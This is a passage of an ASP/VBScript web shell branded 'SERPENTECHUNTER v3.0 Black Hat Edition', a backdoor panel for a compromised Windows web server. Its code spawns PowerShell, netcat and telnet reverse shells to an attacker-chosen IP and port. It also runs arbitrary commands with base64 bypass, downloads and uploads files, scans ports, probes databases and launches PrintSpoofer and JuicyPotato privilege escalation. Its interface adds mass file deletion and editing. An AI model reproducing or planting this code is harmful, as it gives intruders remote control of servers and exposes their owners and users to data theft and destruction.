                streamR.Open
                streamR.Write http.ResponseBody
                streamR.SaveToFile savePath, 2
                streamR.Close
                message = "✅ Downloaded: " & savePath & " (" & http.ResponseBody.Length & " bytes)"
            Else
                message = "❌ HTTP Error: " & http.Status
            End If
            Set http = Nothing
        Else
            message = "❌ No HTTP component available"
        End If
        On Error Goto 0
    End If
End If

If action = "reverse" Then
    revIP = Request.QueryString("ip")
    revPort = Request.QueryString("port")
    If revIP <> "" And revPort <> "" Then
        Dim payloads: payloads = Array("powershell", "netcat", "telnet")
        revOutput = "🌐 REVERSE SHELL: " & revIP & ":" & revPort & vbCrLf & vbCrLf
        For Each p In payloads
            Select Case p
                Case "powershell"
                    cmdRev = "powershell -NoP -NonI -W Hidden -Exec Bypass -Command ""$client = New-Object System.Net.Sockets.TCPClient('" & revIP & "'," & revPort & ");$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"""
                Case "netcat"
                    cmdRev = "nc -e cmd.exe " & revIP & " " & revPort
                Case "telnet"
                    cmdRev = "telnet " & revIP & " " & revPort & " | cmd | telnet " & revIP & " " & (revPort + 1)
            End Select
            Set wshRev = Server.CreateObject("WScript.Shell")
            wshRev.Run "%comspec% /c " & cmdRev, 0, False
            Set wshRev = Nothing
            revOutput = revOutput & "🚀 " & UCase(p) & " reverse shell started (background)." & vbCrLf
        Next
        ' Cek apakah koneksi terbuka (netstat)
        Dim checkCmd: checkCmd = "netstat -an | find """ & revIP & ":" & revPort & """"
        Dim checkResult: checkResult = ExecCmd(checkCmd)
        If InStr(checkResult, "ESTABLISHED") > 0 Then
            revOutput = revOutput & "✅ Reverse shell connection established!" & vbCrLf
        Else
            revOutput = revOutput & "⚠️ No connection yet. Check your listener." & vbCrLf
        End If
        output = revOutput
    Else
        message = "❌ ip and port required!"
    End If
End If

If action = "portscan" Then
    scanHost = Request.QueryString("host")
    scanPorts = Request.QueryString("ports")
    If scanHost <> "" And scanPorts <> "" Then
        portList = Array()
        portArr = Split(scanPorts, ",")
        For Each part In portArr
            part = Trim(part)
            If InStr(part, "-") > 0 Then
                rangeParts = Split(part, "-")
                startP = CInt(rangeParts(0))
                endP = CInt(rangeParts(1))
                For p = startP To endP
                    ReDim Preserve portList(UBound(portList) + 1)
                    portList(UBound(portList)) = p
                Next
            Else
                If IsNumeric(part) Then
                    ReDim Preserve portList(UBound(portList) + 1)
                    portList(UBound(portList)) = CInt(part)
                End If
            End If
        Next
        resultScan = "🔍 PORT SCAN: " & scanHost & " (" & scanPorts & ")" & vbCrLf & vbCrLf
        For Each p In portList
            ' Gunakan PowerShell Test-NetConnection (lebih akurat)
            Dim psCmd: psCmd = "powershell Test-NetConnection " & scanHost & " -Port " & p & " -ErrorAction SilentlyContinue"
            Dim psOut: psOut = ExecCmd(psCmd)
            If InStr(psOut, "TcpTestSucceeded : True") > 0 Then
                resultScan = resultScan & "✅ PORT " & p & " OPEN" & vbCrLf
            Else
                resultScan = resultScan & "❌ PORT " & p & " CLOSED" & vbCrLf
            End If
        Next
        output = resultScan
    Else
        message = "❌ host and ports required!"
    End If
End If

If action = "db" Then
    dbType = Request.QueryString("dbtype")
    dbServer = Request.QueryString("dbserver")
    dbName = Request.QueryString("dbname")
    dbUser = Request.QueryString("dbuser")
    dbPass = Request.QueryString("dbpass")
    If dbType <> "" And dbServer <> "" And dbName <> "" Then
        Set conn = Server.CreateObject("ADODB.Connection")
        Select Case LCase(dbType)
            Case "mssql"
                connStr = "Provider=SQLNCLI11;Data Source=" & dbServer & ";Initial Catalog=" & dbName & ";User ID=" & dbUser & ";Password=" & dbPass & ";"
            Case "access"
                connStr = "Provider=Microsoft.Jet.OLEDB.4.0;Data Source=" & dbServer & ";"
            Case Else
                message = "❌ Unknown database type"
        End Select
        If connStr <> "" Then
            On Error Resume Next
            conn.Open connStr
            If Err.Number <> 0 Then
                message = "❌ DB Error: " & Err.Description
            Else
                message = "✅ Connected to " & UCase(dbType) & "!"
                conn.Close
            End If
            Set conn = Nothing
            On Error Goto 0
        End If
    Else
        message = "❌ dbtype, dbserver, dbname required!"
    End If
End If

If action = "exploit_check" Then
    output = CheckVulnerabilities()
End If

If action = "exploit_run" Then
    expType = Request.QueryString("type")
    Select Case expType
        Case "printspoofer"
            output = ExploitPrintSpoofer()
        Case "juicypotato"
            output = ExploitJuicyPotato()
        Case "auto"
            output = ExploitAuto()
        Case Else
            output = "❌ Unknown exploit type."
    End Select
End If

' ============================================================================
' 🎨 UI (SAMA, TAPI DENGAN PERBAIKAN MASS ACTION)
' ============================================================================
Dim fileData
fileData = GetFileList(cwd)
%>
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>🐍 SERPENTECHUNTER v3.0</title>
<style>
* { margin:0; padding:0; box-sizing:border-box; }
body { background:#0a0a0a; color:#00ff00; font-family:'Courier New',monospace; font-size:13px; }
.container { max-width:1500px; margin:15px auto; padding:0 15px; }
.header { text-align:center; border-bottom:2px solid #00ff00; padding-bottom:10px; margin-bottom:15px; }
.header h1 { color:#00ff00; font-size:32px; text-shadow:0 0 20px #00ff00; }
.header .cwd { color:#888; font-size:13px; margin-top:3px; }
.menu { display:flex; flex-wrap:wrap; gap:8px; margin-bottom:15px; background:#111; padding:10px; border:1px solid #00ff00; border-radius:5px; align-items:center; }
.menu input, .menu select { background:#1a1a1a; border:1px solid #00ff00; color:#00ff00; padding:5px 10px; border-radius:3px; font-family:'Courier New',monospace; font-size:12px; }
.menu button { background:#00ff00; color:#000; border:none; padding:5px 15px; border-radius:3px; cursor:pointer; font-weight:bold; font-size:12px; }
.menu button:hover { background:#00ff88; }
.btn-danger { background:#ff4400; color:#fff; }
.btn-danger:hover { background:#ff6600; }
.btn-upload { background:#ffaa00; color:#000; }
.btn-upload:hover { background:#ffcc44; }
.btn-exploit { background:#ff00ff; color:#000; }
.btn-exploit:hover { background:#ff44ff; }
.grid { display:grid; grid-template-columns:1fr 1fr; gap:20px; }
.panel { background:#111; border:1px solid #00ff00; padding:15px; border-radius:5px; }
.panel h3 { color:#00ff88; margin-bottom:10px; border-bottom:1px solid #00ff0044; padding-bottom:5px; font-size:14px; }
.file-list { max-height:600px; overflow-y:auto; }
.file-item { display:flex; align-items:center; padding:3px 5px; border-bottom:1px solid #00ff0011; }
.file-item:hover { background:#00ff0011; }
.file-item .name { color:#00ff00; text-decoration:none; flex:2; }
.file-item .name.dir { color:#00aaff; }
.file-item .info { color:#666; font-size:11px; flex:1; }
.file-item .actions a { color:#00ff00; text-decoration:none; margin-left:10px; font-size:12px; }
.file-item .actions a:hover { color:#00ff88; }
.file-item .actions .del { color:#ff4444; }
.file-item .actions .del:hover { color:#ff0000; }
.output-box { background:#0d0d0d; border:1px solid #00ff00; padding:10px; border-radius:3px; white-space:pre-wrap; font-size:12px; max-height:400px; overflow-y:auto; margin-top:10px; }
.editor textarea { width:100%; height:400px; background:#0d0d0d; border:1px solid #00ff00; color:#00ff00; padding:10px; font-family:'Courier New',monospace; font-size:12px; border-radius:3px; }
.msg { color:#ffaa00; padding:8px; border:1px solid #ffaa00; border-radius:3px; margin-bottom:10px; text-align:center; }
.footer { text-align:center; border-top:1px solid #00ff0044; padding-top:15px; margin-top:20px; color:#666; font-size:11px; }
.toast { position:fixed; bottom:20px; right:20px; background:#111; border:2px solid #00ff00; padding:15px 25px; border-radius:8px; color:#00ff00; font-size:14px; z-index:9999; display:none; box-shadow:0 0 30px #00ff0044; min-width:200px; text-align:center; }
.toast.show { display:block; animation: fadeInUp 0.3s ease; }
.toast.error { border-color:#ff4444; color:#ff4444; box-shadow:0 0 30px #ff444444; }
@keyframes fadeInUp { from { opacity:0; transform:translateY(20px); } to { opacity:1; transform:translateY(0); } }
@media (max-width:768px){ .grid { grid-template-columns:1fr; } }
</style>
</head>
<body>
<div class="container">
    <div class="header">
        <h1>🐍 SERPENTECHUNTER v3.0</h1>
        <div class="cwd">📂 <%= Server.HTMLEncode(cwd) %></div>
    </div>

    <div id="toast" class="toast"></div>

    <div class="menu">
        <form method="GET" style="display:flex;gap:5px;flex-wrap:wrap;align-items:center;">
            <input type="hidden" name="action" value="exec">
            <input type="text" name="cmd" placeholder="💀 Command (b64:...)" style="flex:1;min-width:150px;">
            <button type="submit">▶ EXEC</button>
        </form>
        <form method="GET" style="display:flex;gap:5px;flex-wrap:wrap;align-items:center;">
            <input type="hidden" name="action" value="search">
            <input type="text" name="pattern" placeholder="🔍 Search..." style="flex:1;min-width:120px;">
            <button type="submit">🔍</button>
        </form>
        <form method="POST" enctype="multipart/form-data" style="display:flex;gap:5px;flex-wrap:wrap;align-items:center;">
            <input type="hidden" name="action" value="upload">
            <input type="file" name="file" style="background:#1a1a1a;border:1px solid #00ff00;color:#00ff00;padding:4px;max-width:180px;">
            <button type="submit" class="btn-upload">⬆ UPLOAD</button>
        </form>
        <a href="?dir=<%= Server.URLEncode(Left(cwd, InStrRev(cwd, "\") - 1)) %>" style="color:#00aaff;text-decoration:none;padding:5px 10px;border:1px solid #00aaff;border-radius:3px;">⬅ UP</a>
        <span style="color:#444;">|</span>
        <form method="GET" style="display:flex;gap:5px;flex-wrap:wrap;align-items:center;">
            <input type="hidden" name="action" value="zip">
            <input type="text" name="folder" placeholder="📁 Folder" style="min-width:80px;">
            <input type="text" name="zipname" placeholder="📦 Zip Name" style="min-width:80px;">
            <button type="submit">📦 ZIP</button>
        </form>
        <form method="GET" style="display:flex;gap:5px;flex-wrap:wrap;align-items:center;">
            <input type="hidden" name="action" value="unzip">
            <input type="text" name="file" placeholder="📦 File.zip" style="min-width:80px;">
            <input type="text" name="dest" placeholder="📁 Dest" style="min-width:80px;">
            <button type="submit">📂 UNZIP</button>
        </form>
        <form method="GET" style="display:flex;gap:5px;flex-wrap:wrap;align-items:center;">
            <input type="hidden" name="action" value="exploit_check">
            <button type="submit" class="btn-exploit">🔍 CHECK VULN</button>
        </form>
        <form method="GET" style="display:flex;gap:5px;flex-wrap:wrap;align-items:center;">
            <input type="hidden" name="action" value="exploit_run">
            <select name="type" style="background:#1a1a1a;border:1px solid #00ff00;color:#00ff00;padding:5px 10px;border-radius:3px;">
                <option value="auto">⚡ AUTO</option>
                <option value="printspoofer">PrintSpoofer</option>
                <option value="juicypotato">JuicyPotato</option>
            </select>
            <button type="submit" class="btn-exploit">🔥 RUN</button>
        </form>
    </div>

    <form method="POST" id="massActionForm">
        <input type="hidden" name="action" id="massAction" value="mass_delete">
        <input type="hidden" name="dest_dir" id="massDestDir">
        <div class="grid">
            <div class="panel">
                <h3>📁 FILE MANAGER
                    <span style="font-size:11px;color:#666;">
                        <button type="button" onclick="selectAll()" style="background:#222;color:#00ff00;border:1px solid #00ff00;padding:0 8px;font-size:10px;border-radius:3px;cursor:pointer;">Select All</button>
                        <button type="button" onclick="deselectAll()" style="background:#222;color:#00ff00;border:1px solid #00ff00;padding:0 8px;font-size:10px;border-radius:3px;cursor:pointer;">Deselect</button>
                    </span>
                </h3>
                <div class="file-list">
                    <% If IsArray(fileData) Then %>
                        <% For i = 0 To UBound(fileData) %>
                        <%
                            f = fileData(i)
                            Dim className, icon
                            If f(2) Then
                                className = "dir"
                                icon = "📁"
                            Else
                                className = ""
                                icon = "📄"
                            End If
                        %>
                        <div class="file-item">
                            <input type="checkbox" name="files" value="<%= Server.HTMLEncode(f(0)) %>" style="margin-right:8px;accent-color:#00ff00;">
                            <span class="name <%= className %>">
                                <%= icon %>
                                <% If f(2) Then %>
                                    <a href="?dir=<%= Server.URLEncode(f(1)) %>" style="color:#00aaff;text-decoration:none;"><%= Server.HTMLEncode(f(0)) %></a>
                                <% Else %>
                                    <a href="?action=edit&file=<%= Server.URLEncode(f(0)) %>&dir=<%= Server.URLEncode(cwd) %>" style="color:#00ff00;text-decoration:none;"><%= Server.HTMLEncode(f(0)) %></a>
                                <% End If %>
                            </span>
                            <span class="info"><%= f(3) %> | <%= f(4) %></span>
                            <span class="actions">
                                <% If Not f(2) Then %>
                                <a href="?action=edit&file=<%= Server.URLEncode(f(0)) %>&dir=<%= Server.URLEncode(cwd) %>" title="Edit">✏️</a>
                                <a href="?action=view&file=<%= Server.URLEncode(f(0)) %>&dir=<%= Server.URLEncode(cwd) %>" title="View">👁️</a>
                                <a href="#" onclick="singleDelete('<%= Server.URLEncode(f(0)) %>')" class="del" title="Delete">🗑️</a>
                                <a href="#" onclick="singleRename('<%= Server.URLEncode(f(0)) %>')" class="del" title="Rename">📝</a>
                                <% Else %>
                                <a href="#" onclick="singleDelete('<%= Server.URLEncode(f(0)) %>')" class="del" title="Delete Folder">🗑️</a>
                                <% End If %>
                            </span>
                        </div>
                        <% Next %>
                    <% Else %>
                        <p style="color:#ff4444;">❌ Directory not found</p>
                    <% End If %>
                </div>
                <div style="margin-top:10px;display:flex;gap:8px;flex-wrap:wrap;">
                    <button type="submit" onclick="setMassAction('mass_delete');return confirm('Delete all selected?')" class="btn-danger">🗑️ DELETE</button>
                    <button type="button" onclick="massRename()" style="background:#ff8800;color:#000;border:none;padding:5px 15px;border-radius:3px;cursor:pointer;">📝 RENAME</button>
                    <button type="button" onclick="massCopy()" style="background:#0088ff;color:#fff;border:none;padding:5px 15px;border-radius:3px;cursor:pointer;">📋 COPY</button>
                    <button type="button" onclick="massMove()" style="background:#aa44ff;color:#fff;border:none;padding:5px 15px;border-radius:3px;cursor:pointer;">📂 MOVE</button>
                </div>
            </div>

            <div class="panel editor">
                <%
                    Dim panelTitle
                    If edit_file <> "" Then
                        panelTitle = "EDIT: " & Server.HTMLEncode(edit_file)
                    ElseIf view_file <> "" Then
                        panelTitle = "VIEW: " & Server.HTMLEncode(view_file)
                    Else
                        panelTitle = "OUTPUT"
                    End If
                %>
                <h3>📝 <%= panelTitle %></h3>
                <% If edit_file <> "" And Not IsNull(edit_content) Then %>
                <form method="POST" action="?action=edit&file=<%= Server.URLEncode(edit_file) %>&dir=<%= Server.URLEncode(cwd) %>" onsubmit="return confirm('Save changes?')">
                    <textarea name="content"><%= Server.HTMLEncode(edit_content) %></textarea>
                    <button type="submit">💾 SAVE</button>
                    <a href="?dir=<%= Server.URLEncode(cwd) %>" style="color:#00ff00;text-decoration:none;padding:5px 15px;border:1px solid #00ff00;border-radius:3px;">✕ CLOSE</a>
                </form>
                <% ElseIf view_file <> "" Then %>
                <div class="output-box" style="max-height:500px;"><%= Server.HTMLEncode(view_content) %></div>
                <a href="?dir=<%= Server.URLEncode(cwd) %>" style="color:#00ff00;text-decoration:none;padding:5px 15px;border:1px solid #00ff00;border-radius:3px;">✕ CLOSE</a>
                <% ElseIf output <> "" Then %>
                <div class="output-box"><%= Server.HTMLEncode(output) %></div>
                <% ElseIf Not IsNull(results) Then %>
                <div class="output-box"><%= Server.HTMLEncode(results) %></div>
                <% Else %>
                <div style="color:#666;padding:20px;text-align:center;">
                    Klik file untuk edit / view<br>atau jalankan command di atas
                </div>
                <% End If %>
            </div>
        </div>
    </form>

    <div class="footer">
        🐍 SERPENTECHUNTER v3.0 &nbsp;|&nbsp; BLACK HAT EDITION (FIXED BY ZAMZZZ)<br>
        <span style="font-size:10px;color:#444;">🔥 BYPASS: Base64 | Header Spoofing | WScript.Shell | Shell.App | WMI | ScriptControl</span>
    </div>
</div>

<script>
function showToast(msg, isError) {
    var toast = document.getElementById('toast');
    toast.textContent = msg;
    toast.className = 'toast show' + (isError ? ' error' : '');
    setTimeout(function(){ toast.className = 'toast'; }, 3000);
}
<% If message <> "" Then %>
showToast('<%= Replace(message, "'", "\'") %>');
<% End If %>
function selectAll() {
    var cbs = document.querySelectorAll('input[name="files"]');
    for(var i=0; i<cbs.length; i++) cbs[i].checked = true;
}
function deselectAll() {
    var cbs = document.querySelectorAll('input[name="files"]');
    for(var i=0; i<cbs.length; i++) cbs[i].checked = false;
}
function setMassAction(action) {
    document.getElementById('massAction').value = action;
}
function singleDelete(file) {
    if(confirm('Delete this item?')) {
        window.location.href = '?action=delete&file=' + encodeURIComponent(file) + '&dir=<%= Server.URLEncode(cwd) %>';
    }
}
function singleRename(file) {
    var newName = prompt('Enter new name:');
    if(newName) {
        window.location.href = '?action=rename&old=' + encodeURIComponent(file) + '&new=' + encodeURIComponent(newName) + '&dir=<%= Server.URLEncode(cwd) %>';
    }
}
function massRename() {
    var files = document.querySelectorAll('input[name="files"]:checked');
    if(files.length === 0) { showToast('Select files first', true); return; }
    var newNames = [];
    var valid = true;
    files.forEach(function(cb) {
        var newName = prompt('New name for ' + cb.value, cb.value);
        if(newName === null) { valid = false; return; }
        newNames.push(newName);
    });
    if(!valid || newNames.length === 0) return;
    var form = document.getElementById('massActionForm');
    form.action = '?dir=<%= Server.URLEncode(cwd) %>&action=mass_rename';
    var existing = form.querySelectorAll('input[name="new_names[]"]');
    existing.forEach(function(el){ el.remove(); });
    newNames.forEach(function(n) {
        var inp = document.createElement('input');
        inp.type = 'hidden';
        inp.name = 'new_names[]';
        inp.value = n;
        form.appendChild(inp);
    });
    form.submit();
}
function massCopy() {
    var files = document.querySelectorAll('input[name="files"]:checked');
    if(files.length === 0) { showToast('Select files first', true); return; }
    var dest = prompt('Destination directory (relative):');
    if(!dest) return;
    var form = document.getElementById('massActionForm');
    form.action = '?dir=<%= Server.URLEncode(cwd) %>&action=mass_copy';
    document.getElementById('massDestDir').value = dest;
    form.submit();
}
function massMove() {
    var files = document.querySelectorAll('input[name="files"]:checked');
    if(files.length === 0) { showToast('Select files first', true); return; }
    var dest = prompt('Destination directory (relative):');
    if(!dest) return;
    var form = document.getElementById('massActionForm');
    form.action = '?dir=<%= Server.URLEncode(cwd) %>&action=mass_move';
    document.getElementById('massDestDir').value = dest;
    form.submit();
}
</script>
</body>
</html>
